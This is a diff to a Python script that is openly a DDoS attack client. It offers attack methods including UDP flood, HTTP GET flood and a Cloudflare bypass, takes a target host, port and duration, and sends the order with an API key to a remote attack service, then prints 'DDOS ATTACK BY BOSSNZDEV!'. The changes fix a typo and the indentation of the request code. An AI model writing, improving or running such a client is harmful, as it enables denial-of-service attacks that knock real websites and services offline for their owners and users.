@@ -31,7 +31,7 @@ key="b0f0124ce70c5d0c3d668c050bfb67ea"
 
 time.sleep(2)
 
-print("METHOD ALL [\nddos : UDP, HTTPGET, CFPYPASS\nOther : RESETPROXY, STOPALL\n]\n")
+print("METHOD ALL [\nddos : UDP, HTTPGET, CFBYPASS\nOther : RESETPROXY, STOPALL\n]\n")
 method = input("method : ")
 
 
@@ -74,8 +74,8 @@ else :
   else :
     timestr = str(time)
     url = " http://"+API+"/?key="+key+"&method="+method+"&host="+host+"&port="+port+"&time="+timestr
-  resp = requests.get(url=url, params=params)
-  data = resp.json()
-  print(data['status'])
+    resp = requests.get(url=url, params=params)
+    data = resp.json()
+    print(data['status'])
 
 print('\n\nDDOS ATTACK BY BOSSNZDEV!')
